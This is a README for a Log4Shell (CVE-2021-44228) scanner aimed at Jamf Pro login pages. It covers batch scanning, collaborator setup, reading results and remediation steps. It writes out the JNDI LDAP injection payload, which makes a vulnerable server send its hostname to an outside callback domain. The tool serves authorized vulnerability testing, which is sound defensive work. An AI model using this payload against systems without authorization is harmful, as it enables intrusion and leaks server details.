# Jamf Pro Log4Shell Vulnerability Scanner

A security testing tool for detecting the Log4Shell (CVE-2021-44228) vulnerability in Jamf Pro installations.

## Overview

This tool tests Jamf Pro systems for the Log4Shell vulnerability by sending specially crafted JNDI LDAP payloads to the login endpoint and monitoring for out-of-band DNS callbacks through a collaborator service.

**Author:** @Random-Robbie

## ⚠️ Legal Disclaimer

**THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

- Only use this tool on systems you own or have explicit written permission to test
- Unauthorized access to computer systems is illegal under various laws including the Computer Fraud and Abuse Act (CFAA) in the US and similar laws worldwide
- The authors assume no liability for misuse or damage caused by this tool
- Use at your own risk

## What is Log4Shell (CVE-2021-44228)?

Log4Shell is a critical remote code execution vulnerability in Apache Log4j 2, a widely-used Java logging library. The vulnerability allows attackers to execute arbitrary code by exploiting JNDI lookup features in log messages.

**CVSS Score:** 10.0 (Critical)

## Features

- 🎯 Single URL testing
- 📋 Batch scanning from file
- 🔍 Out-of-band detection using DNS callbacks
- 🐛 Proxy support for debugging
- 🔐 SSL/TLS support
- 📊 Clear output formatting

## Requirements

- Python 3.6+
- requests
- urllib3

## Installation

1. Clone the repository:
```bash
git clone https://github.com/random-robbie/jamf-log4j.git
cd jamf-log4j
```

2. Install dependencies:
```bash
pip install -r requirements.txt
```

## Usage

### Basic Usage

Test a single Jamf Pro URL:
```bash
python jamf.py -u https://jamf.example.com -c your-collab-id.oastify.com
```

### Batch Scanning

Test multiple URLs from a file (one URL per line):
```bash
python jamf.py -f urls.txt -c your-collab-id.oastify.com
```

Example `urls.txt`:
```
https://jamf1.example.com
https://jamf2.example.com
https://jamf3.example.com
```

### With Debugging Proxy

Use a proxy (e.g., Burp Suite) for traffic inspection:
```bash
python jamf.py -u https://jamf.example.com -c your-collab-id.oastify.com -p http://127.0.0.1:8080
```

## Command-Line Arguments

| Argument | Short | Description | Required |
|----------|-------|-------------|----------|
| `--url` | `-u` | Single URL to test | No (default: http://localhost) |
| `--file` | `-f` | File containing URLs (one per line) | No |
| `--collab` | `-c` | Collaborator URL for callbacks | **Yes** |
| `--proxy` | `-p` | Proxy URL for debugging | No |

## Setting Up a Collaborator

You need an out-of-band callback service to detect the vulnerability. Options include:

### 1. Burp Collaborator (Recommended)
- Available in Burp Suite Professional
- Provides DNS, HTTP, and SMTP callbacks
- Access via Burp Suite: Burp > Burp Collaborator client

### 2. Interactsh (Free)
```bash
# Install interactsh-client
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest

# Run client
interactsh-client
```
Use the provided domain (e.g., `c1234567890.oast.fun`) as your collaborator URL.

### 3. Other Options
- [Canarytokens](https://canarytokens.org/)
- [DNSlog.cn](http://dnslog.cn/) (for DNS only)
- Self-hosted Interactsh server

## How It Works

1. **Payload Generation**: Creates a JNDI LDAP payload with a unique identifier:
   ```
   ${jndi:ldap://h${hostName}.[random-id].[collaborator-url]/test}
   ```

2. **Injection**: Sends the payload in the username field of Jamf Pro's login form

3. **Detection**: If vulnerable, the server processes the payload and makes a DNS lookup to your collaborator, including the hostname

4. **Verification**: Check your collaborator for incoming DNS requests containing the unique identifier

## Interpreting Results

### Vulnerable System
If you receive a DNS callback at your collaborator with the test ID, the system is **vulnerable**.

Example callback:
```
h[jamf-hostname].[test-id].[your-collab-url]
```

### Non-Vulnerable System
- No callback received = System is not vulnerable or payloads are filtered
- HTTP errors = Server may be blocking the request

## Remediation

If you discover a vulnerable system:

1. **Immediate Actions:**
   - Update Log4j to version 2.17.1 or later
   - Apply vendor-specific patches from Jamf
   - Monitor for suspicious activity

2. **Jamf-Specific Guidance:**
   - Check [Jamf's security page](https://www.jamf.com/trust-center/security-updates/) for updates
   - Review Jamf Pro version compatibility with Log4j patches
   - Consider upgrading to the latest Jamf Pro version

3. **General Mitigations:**
   - Set JVM property: `-Dlog4j2.formatMsgNoLookups=true`
   - Remove JndiLookup class: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
   - Deploy Web Application Firewall (WAF) rules

## Example Output

```
======================================================================
Jamf Pro Log4Shell Vulnerability Scanner
Author: @Random-Robbie
Target: CVE-2021-44228 (Log4Shell)
======================================================================

[*] Testing single URL: https://jamf.example.com
[*] Collaborator URL: c1234567890.oast.fun

[*] Request sent to https://jamf.example.com
[*] Test ID: 54321
[!] Check your collaborator for DNS callback: h[hostname].54321.c1234567890.oast.fun
[*] Response Status: 200

======================================================================
[*] Scan complete!
[!] Check your collaborator for any callbacks
======================================================================
```

## References

- [CVE-2021-44228 Details](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Apache Log4j Security Page](https://logging.apache.org/log4j/2.x/security.html)
- [CISA Log4j Guidance](https://www.cisa.gov/log4j)
- [Jamf Trust Center](https://www.jamf.com/trust-center/)

## Contributing

Contributions are welcome! Please ensure all contributions:
- Maintain the tool's focus on authorized security testing
- Include appropriate error handling
- Follow Python best practices
- Include documentation updates

## License

This tool is provided "as is" for authorized security testing purposes only.

## Changelog

### Version 2.0 (2025)
- Refactored to use class-based architecture
- Improved error handling and logging
- Added Python 3 type hints
- Enhanced output formatting
- Added timeout for requests
- Improved documentation
- Better URL validation
- Fixed urllib3 deprecation warnings

### Version 1.0 (2021)
- Initial release
- Basic Log4Shell detection functionality

## Support

For issues or questions:
- Open an issue on GitHub
- Contact: @Random-Robbie

## Acknowledgments

- Security researchers who discovered and disclosed Log4Shell
- The Apache Software Foundation for their rapid response
- The security community for developing detection tools

---

**Remember:** Always obtain proper authorization before testing. Stay legal, stay ethical.
